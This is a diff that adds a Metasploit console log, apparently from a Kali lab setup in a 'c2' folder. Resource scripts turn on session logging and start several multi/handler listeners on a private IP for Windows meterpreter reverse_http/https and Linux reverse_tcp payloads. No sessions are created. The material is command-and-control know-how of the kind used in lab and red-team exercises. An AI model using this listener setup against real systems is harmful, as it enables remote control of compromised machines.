@@ -1,0 +1,109 @@
+[1m[34m[*][0m Processing /home/kali/Desktop/c2/msf-c2/enable_logging.rc for ERB directives.
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> spool /home/kali/Desktop/c2/msf-c2/console.log
+[0m[1m[34m[*][0m Spooling to file /home/kali/Desktop/c2/msf-c2/console.log...
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> setg SessionLogging true
+[0mSession logging enabled.
+SessionLogging => true
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> setg SessionTranscript true
+[0mSessionTranscript => true
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> setg PromptTimeFormat "%Y-%m-%d %H:%M:%S"
+[0mPromptTimeFormat => %Y-%m-%d %H:%M:%S
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> setg Prompt "%T > "
+[0mPrompt => %T > 
+resource (/home/kali/Desktop/c2/msf-c2/enable_logging.rc)> print_status "Logging enabled. Output saved to console.log and ~/.msf4/logs/"
+[0m[1m[31m[-][0m Unknown command: print_status. Run the [32mhelp[0m command for more details.
+[1m[34m[*][0m Processing /home/kali/Desktop/c2/msf-c2/advanced_handler.rc for ERB directives.
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> resource "/home/kali/Desktop/c2/msf-c2/config.rc"
+[0m[1m[34m[*][0m Processing /home/kali/Desktop/c2/msf-c2/config.rc for ERB directives.
+resource (/home/kali/Desktop/c2/msf-c2/config.rc)> setg LHOST 192.168.56.10
+[0mLHOST => 192.168.56.10
+resource (/home/kali/Desktop/c2/msf-c2/config.rc)> setg HTTP_PORT 8080
+[0mHTTP_PORT => 8080
+resource (/home/kali/Desktop/c2/msf-c2/config.rc)> setg HTTPS_PORT 8443
+[0mHTTPS_PORT => 8443
+resource (/home/kali/Desktop/c2/msf-c2/config.rc)> setg TCP_PORT 4444
+[0mTCP_PORT => 4444
+resource (/home/kali/Desktop/c2/msf-c2/config.rc)> setg HttpWait 30
+[0mHttpWait => 30
+resource (/home/kali/Desktop/c2/msf-c2/config.rc)> setg HttpCheckinMax 0
+[0mHttpCheckinMax => 0
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> use multi/handler
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset PAYLOAD
+[0mUnsetting PAYLOAD...
+[1m[33m[!][0m Variable "PAYLOAD" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with [32mset --clear PAYLOAD[0m
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set PAYLOAD windows/meterpreter/reverse_http
+[0mPAYLOAD => windows/meterpreter/reverse_http
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LPORT 8080
+[0mLPORT => 8080
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LHOST 192.168.56.10
+[0mLHOST => 192.168.56.10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitOnSession false
+[0mExitOnSession => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitNoSessions false
+[0m[1m[33m[!][0m Unknown datastore option: ExitNoSessions. Did you mean ExitOnSession?
+ExitNoSessions => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set SessionCommunicationTimeout 10
+[0mSessionCommunicationTimeout => 10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set SessionExpirationTimeout 3600
+[0mSessionExpirationTimeout => 3600
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set HttpWait 30
+[0m[1m[33m[!][0m Unknown datastore option: HttpWait. Did you mean HttpUserAgent?
+HttpWait => 30
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> exploit -j -z
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> use multi/handler
+[0m[1m[34m[*][0m Started HTTP reverse handler on http://192.168.56.10:8080
+[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_http
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset PAYLOAD
+[0mUnsetting PAYLOAD...
+[1m[33m[!][0m Variable "PAYLOAD" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with [32mset --clear PAYLOAD[0m
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set PAYLOAD windows/meterpreter/reverse_https
+[0mPAYLOAD => windows/meterpreter/reverse_https
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LPORT 8443
+[0mLPORT => 8443
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LHOST 192.168.56.10
+[0mLHOST => 192.168.56.10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitOnSession false
+[0mExitOnSession => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitNoSessions false
+[0mExitNoSessions => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set SessionCommunicationTimeout 10
+[0mSessionCommunicationTimeout => 10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set SessionExpirationTimeout 3600
+[0mSessionExpirationTimeout => 3600
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set HttpWait 30
+[0mHttpWait => 30
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> exploit -j -z
+[0m[1m[34m[*][0m Exploit running as background job 1.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> use multi/handler
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_https
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> unset PAYLOAD
+[0mUnsetting PAYLOAD...
+[1m[33m[!][0m Variable "PAYLOAD" unset - but will use a default value still. If this is not desired, set it to a new value or attempt to clear it with [32mset --clear PAYLOAD[0m
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set PAYLOAD linux/x64/meterpreter/reverse_tcp
+[0mPAYLOAD => linux/x64/meterpreter/reverse_tcp
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LPORT 4444
+[0mLPORT => 4444
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set LHOST 192.168.56.10
+[0mLHOST => 192.168.56.10
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitOnSession false
+[0mExitOnSession => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> set ExitNoSessions false
+[0mExitNoSessions => false
+resource (/home/kali/Desktop/c2/msf-c2/advanced_handler.rc)> exploit -j -z
+[0m[1m[34m[*][0m Exploit running as background job 2.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 192.168.56.10:4444 
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+[?1034hstty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+2026-03-05 02:03:51 >  exploit([1m[31mmulti/handler[0m) [0m> stty: 'standard input': Inappropriate ioctl for device
+[0m
